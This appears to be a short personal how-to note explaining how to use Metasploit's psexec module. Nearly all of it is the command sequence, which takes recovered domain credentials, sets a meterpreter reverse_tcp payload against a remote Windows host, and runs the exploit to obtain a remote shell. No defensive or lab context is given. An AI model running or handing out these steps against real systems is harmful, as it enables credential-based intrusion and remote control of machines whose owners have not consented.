## psexec

psexec is a module that can be used in Metasploit's framework. You will need to have recovered the domain and a username/password combination before you can use this. 

To use psexec:

``msfconsole`` - ``no`` to starting the webservice. - ``yes`` to clearing the data. 

Then type:

``use exploit/windows/smb/psexec``

``set PAYLOAD windows/meterpreter/reverse_tcp``

``set RHOSTS REMOTEIP``

``set LHOST YOURIP``

``set SMBUser USERNAME``

``set SMBPass PASSWORD``

``set SMBDomain USERSDOMAIN``

I will then double chek to make sure that I have added the required fields and that there are no typos that I can see.

``show options``

If everything looks good, its time to send it!

``exploit``

If everything worked correctly, you should now have a meterpreter shell on the remote host that looks like:

``meterpreter >``
